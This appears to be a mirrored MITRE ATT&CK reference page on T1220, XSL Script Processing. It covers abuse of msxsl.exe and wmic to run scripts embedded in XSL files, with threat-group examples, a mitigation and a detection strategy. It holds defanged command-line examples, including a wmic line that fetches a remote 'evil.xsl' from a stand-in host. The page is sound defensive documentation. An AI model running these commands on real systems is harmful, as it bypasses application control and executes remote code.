# T1220 - XSL Script Processing

[Enterprise](../../../README.md) / [Stealth](../README.md)

Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.(Citation: Microsoft XSLT Script Mar 2017)

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe)(Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.(Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.(Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)

* <code>msxsl.exe customers[.]xml script[.]xsl</code>
* <code>msxsl.exe script[.]xsl script[.]xsl</code>
* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)

* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>

[MITRE ATT&CK record](https://attack.mitre.org/techniques/T1220)

**Tactics**  [Stealth](../README.md)

**Platforms**  [Windows](../../../Platforms/Windows.md)

## Procedure examples

- [S0373 - Astaroth](../../../Threat%20Intelligence/Software/Malware/S0373%20-%20Astaroth.md) — [Astaroth](https://attack.mitre.org/software/S0373) executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain. (Citation: Cybereason Astaroth Feb 2019) [Cybereason Astaroth Feb 2019](https://www.cybereason.com/blog/information-stealing-malware-targeting-brazil-full-research)
- [G0080 - Cobalt Group](../../../Threat%20Intelligence/Groups/G0080%20-%20Cobalt%20Group.md) — [Cobalt Group](https://attack.mitre.org/groups/G0080) used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.(Citation: Talos Cobalt Group July 2018) [Talos Cobalt Group July 2018](https://blog.talosintelligence.com/2018/07/multiple-cobalt-personality-disorder.html)
- [G0126 - Higaisa](../../../Threat%20Intelligence/Groups/G0126%20-%20Higaisa.md) — [Higaisa](https://attack.mitre.org/groups/G0126) used an XSL file to run VBScript code.(Citation: PTSecurity Higaisa 2020) [PTSecurity Higaisa 2020](https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/)
- [C0022 - Operation Dream Job](../../../Threat%20Intelligence/Campaigns/C0022%20-%20Operation%20Dream%20Job.md) — During [Operation Dream Job](https://attack.mitre.org/campaigns/C0022), [Lazarus Group](https://attack.mitre.org/groups/G0032) used a remote XSL script to download a Base64-encoded DLL custom downloader.(Citation: ESET Lazarus Jun 2020) [ESET Lazarus Jun 2020](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_Operation_Interception.pdf)

## Mitigations

- [M1038 - Execution Prevention](../../../Defenses/Mitigations/M1038%20-%20Execution%20Prevention.md) — If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries.

## Detection strategies

- [DET0205 - Detect XSL Script Abuse via msxsl and wmic](../../../Defenses/Detection%20Strategies/DET0205%20-%20Detect%20XSL%20Script%20Abuse%20via%20msxsl%20and%20wmic.md)

## Sources

- [Reaqta MSXSL Spearphishing MAR 2018](https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/)
- [LOLBAS Wmic](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)
- [Microsoft msxsl.exe](https://web.archive.org/web/20190508171106/https://www.microsoft.com/en-us/download/details.aspx?id=21714)
- [Penetration Testing Lab MSXSL July 2017](https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/)
- [XSL Bypass Mar 2019](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)
- [Microsoft XSLT Script Mar 2017](https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script)
